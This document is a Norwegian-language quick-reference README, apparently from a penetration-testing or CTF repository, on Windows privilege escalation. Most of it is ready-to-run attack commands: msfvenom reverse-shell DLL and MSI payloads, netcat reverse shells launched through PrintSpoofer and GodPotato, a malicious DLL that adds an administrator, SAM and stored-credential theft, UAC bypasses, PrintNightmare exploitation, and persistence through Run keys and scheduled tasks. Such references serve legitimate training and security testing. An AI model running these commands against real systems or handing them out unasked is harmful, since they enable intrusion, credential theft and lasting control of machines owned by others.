# 🪟 Rettighetseskalering i Windows – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Etter utnyttelse">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Komplett veiledning til rettighetseskalering i Windows-systemer</b>
</p>

---

> **Begreper og versjoner:** Rettighetseskalering, identitetsutgivelse med tokens og UAC er forskjellige mekanismer; tjeneste-/filrettigheter, tjenestekonto og restartmulighet avgjør virkningen. UAC-eksemplene er historiske og forutsetter passende konto, policy og Windows-build; de gjør ikke enhver standardbruker til administrator. [WMIC er avviklet](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic), og flere kommandoer forutsetter Windows PowerShell eller eksterne moduler som PowerUp; `Get-ModifiableService` er ikke en innebygd cmdlet. `sc` kan dessuten tolkes annerledes i PowerShell enn i cmd.exe. En sti uten anførselstegn eller en manglende DLL er ikke alene bevis på utnyttbarhet. DLL-listen er forenklet; se [Microsofts søkerekkefølge](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order). Den C-merkede blokken inneholder også en separat msfvenom-kommando. Potato-kompatibilitet krever riktig OS/build, rettigheter og tjenestevilkår; overskriftenes versjoner er ikke garantier. Se [JuicyPotato-prosjektet](https://github.com/ohpe/juicy-potato). Låste registerhiver kan ikke nødvendigvis kopieres direkte selv som SYSTEM. En kjørende Spooler-tjeneste beviser ikke PrintNightmare, og sårbarhetstabellen omfatter også nettverks- og utskriftstjenestefeil, ikke bare kjernen. Eksempler og verdier er bevart.

## 📋 Innholdsfortegnelse

- [Kartlegging](#-kartlegging)
- [Utnyttelse av tjenester](#-utnyttelse-av-tjenester)
- [Tjenestestier uten anførselstegn](#-tjenestestier-uten-anførselstegn)
- [DLL-kapring](#-dll-kapring)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Lagrede påloggingsopplysninger](#-lagrede-påloggingsopplysninger)
- [Manipulering av tokens](#-manipulering-av-tokens)
- [Potato-angrep](#-potato-angrep)
- [Utnyttelse av registeret](#-utnyttelse-av-registeret)
- [Planlagte oppgaver](#-planlagte-oppgaver)
- [Omgåelse av UAC](#-omgåelse-av-uac)
- [Utnyttelse av kjernesårbarheter](#-utnyttelse-av-kjernesårbarheter)
- [Hurtigreferanse](#-hurtigreferanse)

---

## 🔍 Kartlegging

### Systeminformasjon

```cmd
# Systeminformasjon
systeminfo
hostname

# OS-versjon
ver
wmic os get caption,version,buildnumber

# Arkitektur
echo %PROCESSOR_ARCHITECTURE%

# Oppdateringer og hurtigreparasjoner
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Brukerinformasjon

```cmd
# Gjeldende bruker
whoami
whoami /all
whoami /priv
whoami /groups

# Alle brukere
net user
net localgroup administrators

# Brukerdetaljer
net user username

# Gjeldende rettigheter
whoami /priv
```

### Nettverksinformasjon

```cmd
# IP-konfigurasjon
ipconfig /all

# Ruter
route print

# Åpne porter
netstat -ano
netstat -an | findstr LISTENING

# ARP-tabell
arp -a

# DNS-hurtigbuffer
ipconfig /displaydns
```

### Prosesser og tjenester

```cmd
# Prosesser som kjører
tasklist
tasklist /svc
wmic process list full

# Tjenester
sc query
net start
wmic service list brief

# Drivere
driverquery
```

### Kartlegging med PowerShell

```powershell
# Systeminformasjon
Get-ComputerInfo

# Brukere
Get-LocalUser
Get-LocalGroupMember Administrators

# Tjenester
Get-Service

# Prosesser
Get-Process

# Installert programvare
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="-utnyttelse-av-tjenester"></a>
## ⚙️ Utnyttelse av tjenester

### Finn sårbare tjenester

```cmd
# List tjenester
sc query state= all

# Tjenestetillatelser
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Kontroller en bestemt tjeneste
sc qc servicename
```

### Svake tjenestetillatelser

```cmd
# Hvis du kan endre tjenestekonfigurasjonen:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Svake tillatelser på tjenestens binærfil

```cmd
# Kontroller binærfilens tillatelser
icacls "C:\Program Files\Service\binary.exe"

# Hvis filen er skrivbar, erstatt den med en ondsinnet binærfil
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Tjenestekontroll med PowerShell

```powershell
# Hent tjenesteinformasjon
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Finn tjenester som kan endres
Get-ModifiableService
```

---

## 📂 Tjenestestier uten anførselstegn

### Finn stier uten anførselstegn

```cmd
# Finn tjenestestier uten anførselstegn
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Utnytt en sti uten anførselstegn

```
# Hvis stien er: C:\Program Files\Vulnerable Service\service.exe
# Windows søker etter:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Plasser en ondsinnet exe-fil:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Start tjenesten på nytt
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 📚 DLL-kapring

### Finn DLL-filer som mangler

```cmd
# Bruk Process Monitor til å finne DLL-filer som mangler
# Filter: Result = NAME NOT FOUND, Path slutter med .dll

# Vanlige plasseringer som undersøkes:
# 1. Applikasjonskatalogen
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Gjeldende katalog
# 5. Kataloger i PATH
```

### Opprett en ondsinnet DLL

```c
// msfvenom-payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Eller kompiler en egen DLL:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Utnyttelse

```cmd
# Kopier DLL-en til en skrivbar katalog i søkestien
copy evil.dll "C:\Program Files\App\missing.dll"

# Få applikasjonen til å laste DLL-en
# Start tjenesten eller applikasjonen på nytt
```

---

## 📦 AlwaysInstallElevated

### Kontroller om konfigurasjonen er sårbar

```cmd
# Begge må være satt til 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Utnyttelse

```bash
# Generer en ondsinnet MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Overfør og kjør
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Lagrede påloggingsopplysninger

### Credential Manager (påloggingsbehandling)

```cmd
# List lagrede påloggingsopplysninger
cmdkey /list

# Bruk lagrede påloggingsopplysninger
runas /savecred /user:Administrator cmd.exe
```

### SAM & SYSTEM

```cmd
# Kopier SAM-filer (krever SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Fra skyggekopier
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Påloggingsopplysninger i registeret

```cmd
# Passord for automatisk pålogging
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC-passord
reg query "HKCU\Software\ORL\WinVNC3\Password"

# PuTTY-økter
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Filer med passord

```cmd
# Søk etter passord
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Unattend-filer
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# PowerShell-historikk
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS-konfigurasjon
type C:\inetpub\wwwroot\web.config
```

### Wi-Fi-passord

```cmd
# List profiler
netsh wlan show profiles

# Hent passord
netsh wlan show profile name="SSID" key=clear
```

---

## 🎭 Manipulering av tokens

### Kontroller rettigheter

```cmd
whoami /priv

# Farlige rettigheter:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# Hvis SeImpersonatePrivilege er aktivert:
# Bruk Potato-angrep (JuicyPotato, PrintSpoofer osv.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Kan lese enhver fil
# Kopier SAM og SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Kan skrive til enhver plassering
# Erstatt systemfiler
```

---

## 🥔 Potato-angrep

### JuicyPotato (Windows Server 2016/2019)

```cmd
# Krever SeImpersonatePrivilege eller SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Krever SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

## 📝 Utnyttelse av registeret

### Automatisk oppstart (AutoRuns)

```cmd
# Kontroller oppstartsplasseringer
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Hvis plasseringen er skrivbar, legg til en ondsinnet oppføring
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Tjenestenøkler i registeret

```cmd
# Kontroller tillatelser på tjenesteregisteret
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Endre tjenestens ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## ⏰ Planlagte oppgaver

### List planlagte oppgaver

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Finn skrivbare oppgaveskript

```cmd
# Hvis en oppgave kjører et skript du kan endre:
icacls "C:\Scripts\backup.bat"

# Legg til en ondsinnet kommando
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Opprett en ondsinnet oppgave

```cmd
# Hvis du har tillatelse til å opprette oppgaver
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="-omgåelse-av-uac"></a>
## 🛡️ Omgåelse av UAC

### Kontroller UAC-nivået

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Omgåelse via Fodhelper

```cmd
# Virker på Windows 10 (originalens forenkling; se presiseringen)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Rydd opp
reg delete HKCU\Software\Classes\ms-settings /f
```

### Omgåelse via EventViewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 💣 Utnyttelse av kjernesårbarheter

### Kontroller systeminformasjon

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Vanlige eksempler på sårbarheter

| CVE | Windows-versjon | Navn |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | Alle | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | Alle | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Kontroller om systemet er sårbart
Get-Service Spooler

# Utnyttelse (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

## 📊 Hurtigreferanse

### Kartlegging med kommandoer på én linje

```cmd
# Rask informasjon
whoami /all & systeminfo & net user

# Kontroller rettigheter
whoami /priv

# Tjenester
wmic service get name,pathname | findstr /i /v "c:\windows"

# Planlagte oppgaver
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Automatiserte verktøy

| Verktøy | Beskrivelse |
|------|-------------|
| **WinPEAS** | Omfattende kartlegging |
| **PowerUp** | Rettighetseskalering med PowerShell |
| **Seatbelt** | Sikkerhetskontroller |
| **SharpUp** | Kontroller av rettighetseskalering i C# |

### Sjekkliste for raske funn

- [ ] `whoami /priv` – kontroller SeImpersonate
- [ ] Tjenestestier uten anførselstegn
- [ ] Skrivbare tjenestebinærfiler
- [ ] AlwaysInstallElevated
- [ ] Lagrede påloggingsopplysninger (cmdkey /list)
- [ ] Passord for automatisk pålogging i registeret
- [ ] Svake tjenestetillatelser
- [ ] Skript for planlagte oppgaver
- [ ] Kjerneversjon – PrintNightmare?

---

## 📚 Ressurser

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Relaterte hurtigreferanser
- WinPEAS – kildeguiden `WinPEAS/README.md` finnes ikke i denne kopien.
- [Rettighetseskalering i Linux](../../Linux-PrivEsc/translations/README.nb.md)

---

<p align="center">
  <b>🪟 Oppnå SYSTEM-tilgang!</b><br>
  <i>Lær rettighetseskalering i Windows</i>
</p>
